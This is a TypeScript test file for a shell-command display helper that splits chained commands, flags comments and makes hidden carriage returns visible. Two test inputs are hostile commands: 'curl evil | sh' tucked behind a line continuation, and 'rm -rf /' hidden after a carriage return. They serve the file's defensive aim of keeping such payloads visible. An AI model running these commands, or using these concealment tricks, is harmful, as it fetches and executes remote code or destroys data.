import { test, expect } from "bun:test";
import { groupChainSegmentsForDisplay, verbatimCommandLines, middleEllipsis } from "./command-display.js";

test("pipe stages stay inline while chain operators split", () => {
  expect(groupChainSegmentsForDisplay("ls | head -5 && echo done")).toEqual([
    "ls | head -5",
    "echo done",
  ]);
});

test("a lone background & is a display boundary, like the security splitter", () => {
  expect(groupChainSegmentsForDisplay("a & b")).toEqual(["a", "b"]);
});

test("redirect ampersands never split", () => {
  expect(groupChainSegmentsForDisplay("bun run build 2>&1 && echo ok")).toEqual([
    "bun run build 2>&1",
    "echo ok",
  ]);
});

test("backslash-newline continuation does not split a display segment", () => {
  expect(groupChainSegmentsForDisplay("rm x \\\n-rf && echo ok")).toEqual([
    "rm x -rf",
    "echo ok",
  ]);
});

test("heredoc bodies are not enumerated as segments", () => {
  const cmd = "cat << 'EOF'\nline one; still body && more\nEOF\necho after";
  expect(groupChainSegmentsForDisplay(cmd)).toEqual([
    "cat << 'EOF'\nline one; still body && more\nEOF",
    "echo after",
  ]);
});

test("top-level newlines become verbatim lines; quoted newlines stay marked inline", () => {
  expect(verbatimCommandLines('echo "a\nb"\necho two')).toEqual([
    { text: 'echo "a↵b"', isComment: false },
    { text: "echo two", isComment: false },
  ]);
});

test("a full-line comment is flagged, but not on a continuation line", () => {
  expect(verbatimCommandLines("# real comment\necho hi")).toEqual([
    { text: "# real comment", isComment: true },
    { text: "echo hi", isComment: false },
  ]);
  // The shell elides the \-newline and joins the next line onto the command,
  // so a leading # there is executable payload, never an inert comment.
  expect(verbatimCommandLines("rm x \\\n#foo && curl evil | sh")).toEqual([
    { text: "rm x \\", isComment: false },
    { text: "#foo && curl evil | sh", isComment: false },
  ]);
});

test("heredoc body lines are never flagged as comments", () => {
  const lines = verbatimCommandLines("cat << EOF\n# not a comment\nEOF");
  expect(lines).toEqual([
    { text: "cat << EOF", isComment: false },
    { text: "# not a comment", isComment: false },
    { text: "EOF", isComment: false },
  ]);
});

test("bare carriage returns render as a visible marker", () => {
  expect(verbatimCommandLines("echo safe\rrm -rf /")).toEqual([
    { text: "echo safe↵rm -rf /", isComment: false },
  ]);
});

test("middleEllipsis keeps head and tail", () => {
  expect(middleEllipsis("abcdefghij", 20)).toBe("abcdefghij");
  const cut = middleEllipsis("prefix-common middle distinguishing-tail", 20);
  expect(cut.length).toBeLessThanOrEqual(20);
  expect(cut.startsWith("prefix")).toBe(true);
  expect(cut.endsWith("tail")).toBe(true);
  expect(cut).toContain("…");
});
